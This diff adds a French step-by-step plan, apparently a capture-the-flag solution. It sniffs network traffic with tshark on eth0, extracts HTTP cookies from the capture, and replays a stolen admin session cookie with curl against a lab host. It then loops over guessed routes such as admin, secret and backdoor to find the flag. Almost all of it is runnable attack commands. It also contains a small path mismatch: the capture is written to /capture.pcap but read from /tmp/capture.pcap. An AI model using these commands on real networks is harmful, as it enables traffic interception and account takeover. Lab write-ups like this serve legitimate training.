@@ -1,0 +1,23 @@
+---------------------Le Plan d'Action Étape par Étape------------------------
+
+#1 capture le traffic resaux sur notre interface active eth0 (-i) > puis enregister le traffic dans le fichier capture (-w ) :
+
+tshark -i eth0 -w /capture.pcap 
+
+#2 chercher le cookie dans le fichier capture on etulsie les filtre de l outil tshark (-Y) :
+
+tshark -r /tmp/capture.pcap -Y 'http' -T fields -e http.cookie
+
+#3 etuliser les cookies pour ce conencter entant que admin sur le serveur est avoir l acces a l execution d une route qui renvoie le flag :
+
+curl -b "session=abc123xyz" http://10.0.0.2/flag 
+
+#NB : pour le url du flag c est claire mais il peut que le flag soit dans une route non sinificatif alors soit on teste avec les route fameux soit on :
+# en cree une loop qui loop sur une liste de route . et on test :
+# Scanner les routes classiques d'un coup
+for path in flag admin secret dashboard user profile token hidden backdoor pwn get_flag getflag; do
+    echo -n "$path: "
+    curl -s -b "session=eyJ1c2VyIjoiYWRtaW4ifQ.apdlvg.58LPb_bWfqinKmUnCKh6XlLCnrw" http://10.0.0.2/$path
+    echo
+done
+
